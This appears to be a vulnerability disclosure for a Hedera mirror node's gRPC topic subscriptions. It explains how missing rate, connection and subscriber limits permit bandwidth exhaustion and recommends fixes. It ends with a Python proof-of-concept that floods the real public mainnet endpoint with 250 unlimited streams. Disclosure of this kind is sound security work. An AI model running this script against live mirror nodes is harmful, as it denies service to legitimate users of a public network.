### Title
Unbounded gRPC Topic Subscription Enables Outbound Bandwidth Saturation by Unprivileged Users

### Summary
The `filterMessage()` method in `CompositeTopicListener` applies no volume or rate controls — it passes every message for a subscribed topic to every subscriber unconditionally. Because the gRPC module has no per-subscriber bandwidth cap, no total subscriber count limit, and no per-IP connection limit, an unprivileged attacker can open many connections, subscribe to a high-volume topic on each, and saturate the mirror node's outbound network bandwidth, degrading or denying service to legitimate subscribers.

### Finding Description

**Exact code path:**

`CompositeTopicListener.listen()` (lines 35–44) pipes every message from the underlying listener through `filterMessage()` (lines 61–64):

```java
// CompositeTopicListener.java lines 61-64
private boolean filterMessage(TopicMessage message, TopicMessageFilter filter) {
    return message.getTopicId().equals(filter.getTopicId())
            && message.getConsensusTimestamp() >= filter.getStartTime();
}
```

This is the only gate between the raw message stream and the subscriber. It checks only `topicId` equality and `consensusTimestamp >= startTime`. There is no message-rate check, no byte-rate check, and no per-subscriber quota.

**Backpressure buffer is not a rate limit:**

`SharedTopicListener.listen()` (line 24) applies:
```java
.onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
```
`maxBufferSize` defaults to 16 384. This only terminates a *slow* subscriber whose buffer fills up. A fast subscriber (or attacker with a fast uplink) never fills the buffer and is never terminated.

**Per-connection limit is bypassable:**

`GrpcConfiguration` (line 33) sets:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```
`maxConcurrentCallsPerConnection` defaults to 5 (`NettyProperties.java` line 14). This limits calls *per TCP connection*, but there is no total connection limit and no per-IP connection limit visible anywhere in the gRPC module. An attacker opens N connections × 5 subscriptions each.

**No rate limiting in the gRPC module:**

The only throttling code in the repository (`ThrottleConfiguration`, `ThrottleManagerImpl`) lives in the `web3` module and applies exclusively to `ContractCallRequest` objects. There is no equivalent `Bucket4j` or any other rate-limiting mechanism applied to gRPC topic subscriptions.

**No subscriber count enforcement:**

`TopicMessageServiceImpl` tracks `subscriberCount` (line 48) as a Micrometer gauge only — it is never compared against a maximum and never used to reject new subscriptions.

**Exploit flow:**

1. Attacker identifies a high-volume HCS topic (e.g., a topic used by a popular dApp receiving thousands of messages/second).
2. Attacker opens M TCP connections to port 5600 (no connection limit).
3. On each connection, attacker opens 5 `subscribeTopic` streams (the per-connection maximum), all targeting the same active topic with `startTime = now`, `limit = 0` (unlimited), no `endTime`.
4. `CompositeTopicListener.listen()` → `filterMessage()` passes every message to every stream.
5. The mirror node must serialize and transmit M × 5 copies of every topic message over its outbound NIC.
6. Outbound bandwidth is exhausted; legitimate subscribers experience packet loss, stream stalls, or `onBackpressureBuffer` overflow errors.

### Impact Explanation

The mirror node's gRPC service becomes unavailable or severely degraded for all other subscribers. Because the mirror node is the authoritative source for HCS message delivery to applications, this constitutes a denial-of-service against the mirror node's network processing capacity. The severity matches the stated scope: ≥30% degradation of network processing nodes without brute-force (no credential cracking, no exploit of memory corruption — just valid API calls).

### Likelihood Explanation

No authentication is required to call `subscribeTopic`. Any internet-accessible mirror node is reachable. The attacker needs only a gRPC client (e.g., `grpcurl`, the Hedera SDK, or a custom script), knowledge of one active topic ID (publicly observable on-chain), and sufficient upload bandwidth to keep connections open. The attack is trivially repeatable and scriptable. Active topics on mainnet regularly receive hundreds of messages per minute, making the amplification factor significant.

### Recommendation

1. **Per-subscriber message rate limit**: Apply a token-bucket rate limiter (analogous to `ThrottleConfiguration` in the `web3` module) inside `CompositeTopicListener.listen()` or `TopicMessageServiceImpl.subscribeTopic()`, capping messages-per-second delivered to a single subscription.
2. **Global subscriber count cap**: Enforce a configurable maximum in `TopicMessageServiceImpl.subscribeTopic()` — reject new subscriptions when `subscriberCount` exceeds the limit.
3. **Per-IP connection limit**: Configure Netty's `maxConnectionsPerIp` or add a `ChannelHandler` that tracks and limits connections per remote address.
4. **Per-topic subscriber cap**: Reject subscriptions to a topic when the number of active subscribers for that topic exceeds a configurable threshold.
5. **Mandatory `limit` or `endTime`**: Require at least one of `limit > 0` or `endTime != null` for live (non-historical) subscriptions to prevent indefinite unlimited streams.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools hedera-sdk or raw grpc stubs
import grpc, threading

TARGET = "mainnet-public.mirrornode.hedera.com:443"
ACTIVE_TOPIC_ID = "0.0.12345"   # replace with a known high-volume topic
NUM_CONNECTIONS = 50
STREAMS_PER_CONN = 5            # matches maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = ConsensusServiceStub(channel)
    streams = []
    for _ in range(STREAMS_PER_CONN):
        req = ConsensusTopicQuery(
            topicID=TopicID(topicNum=12345),
            consensusStartTime=Timestamp(seconds=0),
            # no limit, no end time
        )
        streams.append(stub.subscribeTopic(req))
    # drain all streams concurrently, maximizing outbound bandwidth from server
    for s in streams:
        for _ in s:
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: server must push NUM_CONNECTIONS * STREAMS_PER_CONN copies of every
# topic message, exhausting outbound NIC bandwidth and starving other subscribers.
```